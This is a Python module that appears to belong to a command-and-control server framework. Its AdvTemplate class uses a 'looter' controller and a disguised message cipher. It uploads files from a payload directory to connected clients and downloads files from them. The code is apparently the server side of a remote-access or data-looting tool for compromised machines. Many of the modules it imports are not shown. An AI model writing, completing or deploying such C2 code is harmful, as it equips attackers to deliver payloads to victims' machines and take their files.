import socket
import selectors
import base64
import os
import threading
import json


from multiprocessing import Process, Pipe
from threading import Thread, Event
from time import sleep

from .basic_templates import BasicTemplate

from ..CONFIG import DEFAULT_IP, RAW_LEN, FORMAT_CODE, SOCKETS_DIR, LISTENING_STEP, EXTRAS_DIR, OUTPUT_DIR, PAYLOAD_DIR
from .tools import MrHandler, LocalAPI
from .controlers import BasicControler, LooterControler
from ..chameleon import Chameleon
from ..tools import Messenger
from .xtra_socket import ExtraSocket


class AdvTemplate(BasicTemplate):
    def __init__(self, pipes, conf, stop_signal, controler=LooterControler, client_handler=MrHandler, msg_crypt=Chameleon, api=LocalAPI):
        super().__init__(pipes, conf, stop_signal, controler=LooterControler, client_handler=MrHandler, msg_crypt=Chameleon, api=LocalAPI)
        self.out_dir = os.path.join(OUTPUT_DIR, self.name)
        self.payload_dir = PAYLOAD_DIR
        self._ExSoc = ExtraSocket
        self.Extra = {}
        self.make_dirs()

    def make_dirs(self):
        if not os.path.exists(self.out_dir):
            os.mkdir(self.out_dir)
        if not os.path.exists(self.payload_dir):
            os.mkdir(self.payload_dir)
    
    def download_file(self, cmd, handler):
        extra = self._ExSoc(cmd[1], cmd[2], self, self._ip, work="download")
        if not extra.build():
            self.Msg(f"[{self.name}] [!!] ERROR: download file abort [!!]")
            self.send_msg("0", handler)
            return False
        else:
            self.send_msg(extra.port, handler)
        extra.start()
    
    def upload_file(self, cli_id, name):
        fpath = os.path.join(self.payload_dir, name)
        if not os.path.exists(fpath):
            self.Msg(f"[{self.name}] [!!] ERROR: file does not exists [!!]", level=True)
            return False
        flen = os.stat(fpath).st_size
        extra = self._ExSoc(flen, name, self, self._ip, work="upload")
        if not extra.build():
            self.Msg(f"[{self.name}] [!!] ERROR: upload file abort [!!]")
            return None
        flen = str(flen)
        self.send_msg(f"up {name} {flen} {str(extra.port)}", cli_id)
        extra.start()

   


    def exec_sys(self, msg, handler):
        if self._exec_sys(msg, handler):
            return True
        cmd = self.unpack_sys(msg)
        if cmd[0] == "down":
            self.download_file(cmd, handler)


